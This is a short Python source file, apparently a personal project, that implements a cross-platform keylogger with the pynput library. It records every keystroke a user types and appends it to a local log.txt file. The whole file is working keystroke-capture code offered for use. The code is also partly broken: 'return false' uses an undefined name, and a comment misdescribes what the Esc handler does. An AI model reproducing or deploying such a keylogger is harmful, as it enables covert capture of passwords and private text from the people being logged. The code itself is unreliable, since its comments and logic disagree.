'''This program is a keylogger that runs on all platforms when python is installed. After running, the program saves
all keylog output on a file called log.txt. Everytime the user presses the space key, a new line is
created in the log.txt file.
Written by Simone Onorato
Kingston, Ontario
for questions or support please email simon.onorato@queensu.ca'''

import pynput
from pynput.keyboard import Key, Listener

#Creating global variables
count = 0
keys = []

#This function captures every keystroke
def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= 1:
        count = 0
        write_file(keys)
        keys=[]

#This function writes captured keystrokes to a file
def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)

#This function stops the user from quitting the program by pressing esc
def on_release(key):
    if key == Key.esc:
        return false

#This function runs the program.
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

